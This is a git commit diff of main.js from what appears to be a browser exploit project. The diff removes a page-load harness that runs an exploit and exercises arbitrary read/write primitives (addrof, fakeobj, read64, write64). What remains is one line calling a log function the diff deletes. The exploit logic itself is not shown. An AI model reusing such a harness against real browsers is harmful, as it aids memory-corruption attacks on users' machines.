0882836b24318562d5d2490a45c22348c821f7dd
dumbButSkilledDev <111146406+dumbButSkilledDev@users.noreply.github.com>
2025-07-04 12:38:07 -0700

    Add files via upload

--- main.js
+++ main.js
@@ -1,23 +1,3 @@
 // main.js
 
-function log(msg) {
-    const logDiv = document.getElementById('log');
-    logDiv.textContent += msg + '\n';
-    void logDiv.offsetHeight;
-}
-
-window.onload = async function() {
-    log('Starting exploit...');
-    try {
-        await runExploit(log);
-        log('Exploit complete!');
-        // Example usage of primitives:
-        let addr = addrof({});
-        let fake = fakeobj(addr);
-        let val = read64(addr);
-        write64(addr, 0x41414141n);
-        log(`Address: 0x${addr.toString(16)}, Fake Object: ${fake}, Value Read: 0x${val.toString(16)}`);
-    } catch(e) {
-        log('Exploit failed: ' + e);
-    }
-};
+log("stage 1: exploit setup..");
